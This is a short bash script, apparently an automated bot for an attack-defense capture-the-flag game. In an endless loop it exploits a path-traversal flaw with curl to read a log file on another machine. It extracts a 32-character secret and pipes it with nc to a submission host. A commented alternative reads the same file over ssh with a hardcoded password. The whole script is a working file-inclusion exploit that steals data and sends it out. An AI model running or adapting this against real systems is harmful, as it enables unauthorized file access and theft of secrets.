#!/bin/bash

address='player@10.1.10'
end='.1'
while true; do
    for i in {1..3}; do
        echo $address$i$end 
        s="curl http://10.1.102.1/index.php?p=../../../../home/player/secret-service/logs | grep -oE ".[[:alnum:]]{32}"|tail -1"
        #    s="sshpass -p 'password' ssh  $address$i$end 'cat secret-service/logs' |grep -oE ".[[:alnum:]]{32}"|tail -1 " 
        b=`echo $s|bash`
        echo $b
        echo -e '1\n'$b|nc 10.1.100.1 31337
    done
done
